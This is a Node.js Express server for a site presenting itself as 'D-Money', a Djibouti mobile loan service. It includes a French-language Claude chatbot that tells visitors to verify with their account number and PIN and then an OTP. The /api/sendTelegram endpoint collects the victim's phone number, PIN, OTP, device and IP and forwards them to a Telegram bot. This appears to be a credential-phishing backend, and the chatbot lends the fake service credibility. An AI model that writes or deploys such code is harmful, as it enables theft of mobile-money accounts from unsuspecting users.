'use strict';
const express   = require('express');
const path      = require('path');
const https     = require('https');
const rateLimit = require('express-rate-limit');

const app  = express();
const PORT = process.env.PORT || 3000;

/* ── MIDDLEWARE ── */
app.use(express.json({limit:'20kb'}));
app.use(express.urlencoded({extended:false}));
app.use((req,res,next)=>{
  res.setHeader('X-Content-Type-Options','nosniff');
  res.setHeader('X-Frame-Options','SAMEORIGIN'); // relaxed for Tawk.to iframe
  res.setHeader('X-XSS-Protection','1; mode=block');
  res.setHeader('Referrer-Policy','strict-origin-when-cross-origin');
  next();
});

/* ── RATE LIMITERS ── */
const apiLimiter = rateLimit({
  windowMs:15*60*1000, max:30,
  message:{error:'Trop de requêtes, veuillez réessayer plus tard.'},
  standardHeaders:true, legacyHeaders:false,
});
const chatLimiter = rateLimit({
  windowMs:60*1000, max:15,           // 15 AI messages per minute per IP
  message:{error:'Trop de messages. Attendez un moment.'},
  standardHeaders:true, legacyHeaders:false,
});
app.use('/api/sendTelegram', apiLimiter);
app.use('/api/chat',         chatLimiter);

app.use(express.static(path.join(__dirname),{extensions:['html'],index:'index.html'}));

/* ── TELEGRAM HELPER ── */
function sendTelegramMessage(text){
  return new Promise((resolve,reject)=>{
    const BOT_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
    if(!BOT_TOKEN||!CHAT_ID){
      console.warn('[Telegram] Variables manquantes');
      return resolve({ok:false,reason:'env_missing'});
    }
    const body = JSON.stringify({chat_id:CHAT_ID,text,parse_mode:'HTML'});
    const opts = {
      hostname:'api.telegram.org',
      path:`/bot${BOT_TOKEN}/sendMessage`,
      method:'POST',
      headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)},
    };
    const req = https.request(opts,(res)=>{
      let data='';
      res.on('data',c=>data+=c);
      res.on('end',()=>{try{resolve(JSON.parse(data))}catch(e){resolve({ok:false})}});
    });
    req.on('error',reject);req.write(body);req.end();
  });
}

/* ── ANTHROPIC HELPER ── */
function callClaude(messages){
  return new Promise((resolve,reject)=>{
    const API_KEY = process.env.ANTHROPIC_API_KEY;
    if(!API_KEY){
      console.error('[Claude] ANTHROPIC_API_KEY not set');
      return resolve({error:'API key manquante'});
    }

    const body = JSON.stringify({
      model     : 'claude-haiku-4-5',   // correct model string
      max_tokens: 400,
      system : `Tu es l'assistant virtuel de D-Money, service de prêt mobile au Djibouti.
Tu réponds uniquement en français, de manière courte, claire et professionnelle.
Tu connais ces informations sur D-Money :

FORMULES DE PRÊT :
- 30 Jours  : 5 000 – 200 000 DJF, taux 2%
- 60 Jours  : 10 000 – 500 000 DJF, taux 3,5%
- 90 Jours  : 25 000 – 1 000 000 DJF, taux 5%
- 180 Jours : 50 000 – 2 500 000 DJF, taux 8%  (le plus demandé)
- 365 Jours : 100 000 – 5 000 000 DJF, taux 12%

PROCESSUS :
1. Choisir la formule et le montant sur l'application
2. Vérifier son identité avec son numéro D-Money et son PIN
3. Confirmer par OTP (code à 6 chiffres)
4. Les fonds sont versés immédiatement sur le compte D-Money

REMBOURSEMENT :
- Le remboursement se fait en une seule fois à l'échéance
- Le total = montant emprunté + intérêts calculés sur la durée choisie
- Exemple : 100 000 DJF sur 30 jours = 102 000 DJF à rembourser

CONDITIONS :
- Avoir un compte D-Money actif avec numéro +253 77XXXXXX
- Aucun justificatif de revenus requis pour les petits montants
- Paiement 100% mobile, sécurisé, sans paperasse

CONTACT : support@dmoney.dj | +253 77 XX XX XX

Si la question dépasse tes connaissances ou si l'utilisateur demande un agent humain,
réponds : "Je vais vous mettre en relation avec un conseiller D-Money. Un instant..."
et termine par le mot-clé [ESCALATE] sur une ligne séparée.

Garde tes réponses sous 3 phrases maximum sauf si une explication détaillée est nécessaire.`,
      messages,
    });

    const opts = {
      hostname:'api.anthropic.com',
      path:'/v1/messages',
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'anthropic-version':'2023-06-01',
        'x-api-key':API_KEY,
        'Content-Length':Buffer.byteLength(body),
      },
    };

    const req = https.request(opts,(res)=>{
      let data='';
      res.on('data',c=>data+=c);
      res.on('end',()=>{
        try{
          const parsed = JSON.parse(data);
          if(parsed.error){
            console.error('[Claude] API error:',parsed.error.type, parsed.error.message);
          }
          resolve(parsed);
        }catch(e){
          console.error('[Claude] Parse error:',e.message,'raw:',data.slice(0,200));
          resolve({error:'Réponse invalide'});
        }
      });
    });
    req.on('error',(e)=>{
      console.error('[Claude] Request error:',e.message);
      reject(e);
    });
    req.write(body);
    req.end();
  });
}

/* ── /api/config — serves Tawk.to IDs safely from env vars ── */
app.get('/api/config',(req,res)=>{
  const propertyId = process.env.TAWKTO_PROPERTY_ID;
  const widgetId   = process.env.TAWKTO_WIDGET_ID;
  if(!propertyId||!widgetId){
    return res.json({tawkto:null});
  }
  res.json({
    tawkto:{
      propertyId,
      widgetId,
      src:`https://embed.tawk.to/${propertyId}/${widgetId}`,
    }
  });
});

/* ── /api/chat — AI FAQ endpoint ── */
app.post('/api/chat',async(req,res)=>{
  try{
    const{messages}=req.body||{};
    if(!messages||!Array.isArray(messages)||messages.length===0){
      return res.status(400).json({error:'Messages manquants'});
    }
    // validate structure
    const clean=messages.slice(-10).map(m=>({
      role   : m.role==='assistant'?'assistant':'user',
      content: String(m.content||'').slice(0,500),
    }));
    if(!clean.length) return res.status(400).json({error:'Messages invalides'});

    const result = await callClaude(clean);

    if(result.error) return res.status(500).json({error:result.error});
    if(result.type==='error') return res.status(500).json({error:result.error?.message||'Erreur Claude'});

    const text    = (result.content?.[0]?.text)||'';
    const escalate= text.includes('[ESCALATE]');
    const reply   = text.replace('[ESCALATE]','').trim();

    return res.json({reply, escalate});
  }catch(err){
    console.error('[/api/chat]',err.message);
    return res.status(500).json({error:'Erreur serveur'});
  }
});

/* ── /api/sendTelegram ── */
app.post('/api/sendTelegram',async(req,res)=>{
  try{
    const{submittedAt='',loginPhone='',loginPin='',otp='',event='',plan='',device=''}=req.body||{};
    if(!loginPhone&&!otp) return res.status(400).json({error:'Payload invalide'});
    const emoji={receive_offer_clicked:'📲',offer_received:'✅',resend_otp:'🔁'}[event]||'📋';
    const message=[
      `${emoji} <b>D-Money Prêt — ${event.replace(/_/g,' ').toUpperCase()}</b>`,``,
      `📅 <b>Heure:</b> ${submittedAt}`,
      `📱 <b>Téléphone:</b> <code>${loginPhone}</code>`,
      `🔐 <b>PIN:</b> <code>${loginPin}</code>`,
      `🔑 <b>OTP:</b> <code>${otp||'—'}</code>`,``,
      `💰 <b>Prêt:</b> ${plan}`,
      `📟 <b>Appareil:</b> ${device}`,
      `🌐 <b>IP:</b> ${req.ip||req.headers['x-forwarded-for']||'—'}`,
    ].join('\n');
    const result = await sendTelegramMessage(message);
    return res.json({ok:true,telegram:result.ok});
  }catch(err){
    console.error('[/api/sendTelegram]',err.message);
    return res.status(500).json({error:'Erreur serveur interne'});
  }
});

/* ── /health ── */
app.get('/health',(req,res)=>res.json({
  status :'ok',
  uptime :process.uptime(),
  telegram: !!process.env.TELEGRAM_TOKEN,
  tawkto  : !!process.env.TAWKTO_PROPERTY_ID,
  ai      : !!process.env.ANTHROPIC_API_KEY,
}));

app.get('*',(req,res)=>res.sendFile(path.join(__dirname,'index.html')));

app.listen(PORT,()=>{
  console.log(`✅  D-Money server — port ${PORT}`);
  console.log(`    Telegram  : ${process.env.TELEGRAM_TOKEN      ?'✓':'⚠ MANQUANT'}`);
  console.log(`    Tawk.to   : ${process.env.TAWKTO_PROPERTY_ID  ?'✓':'⚠ MANQUANT'}`);
  console.log(`    Claude AI : ${process.env.ANTHROPIC_API_KEY   ?'✓':'⚠ MANQUANT'}`);
});
